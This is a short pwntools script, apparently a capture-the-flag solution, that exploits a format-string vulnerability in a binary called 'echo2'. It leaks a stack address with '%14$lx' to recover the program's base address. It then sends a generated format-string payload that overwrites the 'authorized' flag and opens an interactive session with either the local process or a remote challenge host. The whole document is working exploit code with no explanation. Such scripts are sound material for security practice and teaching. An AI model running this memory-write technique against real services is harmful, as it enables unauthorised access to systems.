from pwn import *


exe = ELF("echo2")
libc = ELF("./libc.so.6")
rop = ROP(exe)

context.binary = exe

# context.log_level = 'error'

def conn():
    if args.REMOTE:
        r = remote("128.199.12.141", 7013)
    else:
        r = exe.process()
    return r
# def exec_fmt(payload):
#     r = conn()
#     r.sendline(payload)
#     r.recvline()
#     return r.recvline()
# autofmt = FmtStr(exec_fmt)
# print(autofmt.offset)

r = conn()
r.sendline(f"%{14}$lx".encode())
r.recvline()
exe.address = int(r.recvline().decode().rstrip(),16) - 0x12c0
r.sendline(fmtstr_payload(6, {exe.symbols['authorized']: 1}))
# print(hex(exe.symbols['authorized']))
# r.close()
# automate inputs as necessary here

r.interactive()
